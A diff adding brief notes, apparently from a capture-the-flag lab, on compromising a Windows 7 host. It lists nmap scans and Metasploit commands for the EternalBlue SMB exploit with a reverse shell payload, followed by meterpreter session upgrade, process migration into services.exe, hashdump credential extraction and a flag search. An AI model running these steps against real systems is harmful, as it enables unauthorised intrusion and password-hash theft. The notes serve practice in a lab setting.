@@ -1,0 +1,24 @@
+>> nmap -A -sV 10.10.190.166 | tee nmap_scan
+OR
+>> nmap -sS -Pn -A -p- -oN nmap_scan 10.10.190.166
+
+# Google>> windows 7 professional 7601 service pack 1 microsoft-ds exploit 
+
+msf > use exploit/windows/smb/ms17_010_eternalblue
+msf > set payload windows/x64/shell/reverse_tcp
+msf > search shell_to_meterpreter
+
+>> set session <id>
+>> run 
+>> sessions -l
+>> sessions <id: (<type: meterpreter x64/windows>)>
+>> sysinfo
+>> getpid
+>> migrate <(to any process that is running by the system: services.exe)>
+
+>> hashdump
+
+# Check around in the C://
+# Check C:\Windows\System32\
+## Found this command: search -f flag*txt
+
